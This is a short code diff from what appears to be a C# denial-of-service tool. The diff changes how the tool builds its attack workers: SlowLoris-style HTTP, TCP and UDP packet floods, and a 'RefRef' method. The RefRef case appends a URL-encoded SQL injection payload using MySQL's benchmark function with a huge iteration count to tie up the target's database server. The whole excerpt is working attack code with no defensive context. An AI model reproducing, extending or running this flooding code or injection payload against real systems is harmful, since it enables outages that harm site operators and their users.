@@ -65,10 +65,10 @@ namespace GAS.Core
 					Worker = new SlowLoic(DNSString, Target.ToString(), Port, Subsite, Delay, Timeout, AppendRANDOMChars || AppendRANDOMCharsUrl, SPT, AppendRANDOMCharsUrl, USEGet, UseGZIP, Threads);
 					break;
 				case AttackMethod.TCP:
-					Worker = new PacketFlood(Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
+					Worker = new PacketFlood(Target.ToString(), Port, 1, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads,SPT);
 					break;
 				case AttackMethod.UDP:
-					Worker = new PacketFlood(Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads);
+					Worker = new PacketFlood(Target.ToString(), Port, 2, Delay, WaitForResponse, Data, AppendRANDOMChars, Threads,SPT);
 					break;
 				case AttackMethod.RefRef:
 					this.Subsite += " and (select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))".Replace(" ", "%20");
